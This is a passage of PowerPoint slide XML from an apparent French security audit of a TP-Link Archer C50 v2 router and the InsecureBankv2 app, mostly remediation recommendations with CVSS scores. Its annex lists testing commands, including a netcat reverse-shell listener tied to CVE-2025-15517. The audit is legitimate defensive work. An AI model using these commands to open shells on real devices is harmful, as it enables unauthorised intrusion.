          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="22768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0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— CVSS 9.1</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="2029968"/>
            <a:ext cx="6382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Implémenter JWT avec expiration 15 min sur /changepassword. Exiger l'ancien mot de passe. Vérification du token côté serveur obligatoire.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2560320"/>
            <a:ext cx="8503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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2560320"/>
            <a:ext cx="548640" cy="53035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6" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2560320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fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="2651760"/>
            <a:ext cx="960120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8" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="265176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0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IMMÉDIAT</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="288036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0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— CVSS 9.1</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="2633472"/>
            <a:ext cx="6382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d'ownership côté serveur sur /dotransfer : vérifier que from_acc appartient à l'utilisateur authentifié. Ne jamais faire confiance aux paramètres client.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3163824"/>
            <a:ext cx="8503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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3163824"/>
            <a:ext cx="548640" cy="53035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3" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="316382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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Shape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="3255264"/>
            <a:ext cx="960120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5" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="325526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0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IMMÉDIAT</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="348386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0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CVE-2025-15517 CVSS 8.6</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="3236976"/>
            <a:ext cx="6382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Implémenter validation cryptographique RSA des firmwares avant sysupgrade. Activer Secure Boot. Restreindre l'accès à l'interface LuCI au réseau admin uniquement.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Shape 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3767328"/>
            <a:ext cx="8503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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Shape 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3767328"/>
            <a:ext cx="548640" cy="53035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40" name="Text 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3767328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fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Shape 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="3858768"/>
            <a:ext cx="960120" cy="20116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42" name="Text 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="38587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0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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="408736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0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— CVSS 7.5</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="3840480"/>
            <a:ext cx="6382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Remplacer la clé AES hardcodée par Android Keystore System. Générer un IV aléatoire (SecureRandom) par opération. Supprimer 'superSecurePassword' du code.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Shape 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4370832"/>
            <a:ext cx="8503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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Shape 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4370832"/>
            <a:ext cx="548640" cy="53035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47" name="Text 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4370832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fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Shape 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="4462272"/>
            <a:ext cx="960120" cy="20116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49" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="446227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0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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Text 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="46908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0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V7/V8 — CVSS 7.5</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Text 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="4443984"/>
            <a:ext cx="6382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Migrer l'intégralité des communications vers HTTPS avec Certificate Pinning. Interdire strictement HTTP en production. Renouveler les certificats tous les 90 jours.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Shape 50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53" name="Text 5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00" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof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4" name="Text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00" noProof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 |  Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="54864"/>
            <a:ext cx="201168" cy="4901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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="137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kern="0" spc="300" noProof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07b — RECOMMANDATIONS</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="38404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>
                <a:solidFill>
                  <a:srgbClr val="1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Moyen &amp; long terme — Renforcement systémique</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2200" noProof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8503920" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="10058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Gouvernance, conformité et défense en profondeur</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1050" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="548640" cy="6858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2" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="1444752"/>
            <a:ext cx="960120" cy="2011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4" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="14447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 TERME</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="168249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0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V6/V9 — CVSS 7.3</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="1444752"/>
            <a:ext cx="6382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exported=false sur toutes les activités internes. Désactiver le mode DEBUG. Supprimer les logs sensibles (credentials, tokens) des traces applicatives.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2121408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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2121408"/>
            <a:ext cx="548640" cy="6858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9" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2121408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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="2212848"/>
            <a:ext cx="960120" cy="2011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1" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="22128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 TERME</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="24505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0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V5/V10 — CVSS 7.4</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="2212848"/>
            <a:ext cx="6382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la notification SMS contenant le mot de passe. Désactiver allowBackup. Protéger le ContentProvider TrackUserProvider avec permission explicite.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2889504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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2889504"/>
            <a:ext cx="548640" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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6" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2889504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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="2980944"/>
            <a:ext cx="960120" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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8" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="298094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TERME</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="321868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0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fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="2980944"/>
            <a:ext cx="6382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rate-limiting sur tous les Endpoints API. Implémenter MFA obligatoire (TOTP/SMS sécurisé). Connecter un SIEM avec alertes sur comportements anormaux.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3657600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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3657600"/>
            <a:ext cx="548640" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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3" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="365760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R9</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Shape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="3749040"/>
            <a:ext cx="960120" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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5" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="374904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TERME</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="39867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0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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="3749040"/>
            <a:ext cx="6382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de re-test après correctifs (2-4 sprints). Intégrer Security by Design dans le cycle de développement. Revue de code sécurisé en CI/CD pipeline.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Shape 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4480560"/>
            <a:ext cx="8503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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="45354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b="1" noProof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Défense en profondeur : </a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Text 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="453542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: TLS + VPN  |  Endpoints : Secure Boot + signature RSA firmware  |  Application : JWT + MFA  |  Base de données : chiffrement AES-256 (Keystore)  |  Monitoring : SIEM</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Shape 40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43" name="Text 4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00" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof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4" name="Text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00" noProof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 |  Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="54864"/>
            <a:ext cx="201168" cy="4901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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="137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kern="0" spc="300" noProof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ANNEXES</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="38404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>
                <a:solidFill>
                  <a:srgbClr val="1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Commandes &amp; Outils — Référence Technique</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2200" noProof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8503920" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="10058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0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Reproduction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="105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des tests</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="10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fr-FR" sz="105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en environnement contrôlé</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1050" noProof="0"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0040" y="1353312"/>
            <a:ext cx="8503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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="850392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2" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="13533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Firmware — Extraction &amp; Émulation</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1627632"/>
            <a:ext cx="850392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4" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="1673352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50" noProof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binwalk -e firmware_tplink_c50_v2.bin              # extraction FS</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="1865376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50" noProof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python3 fat.py firmware.bin                        # émulation QEMU</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="2057400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50" noProof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nmap -sV -p- 192.168.x.x                          # scan services émulés</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="224942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50" noProof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nc -lvnp 4444                                      # écoute reverse shell (CVE-2025-15517)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2587752"/>
            <a:ext cx="8503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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2587752"/>
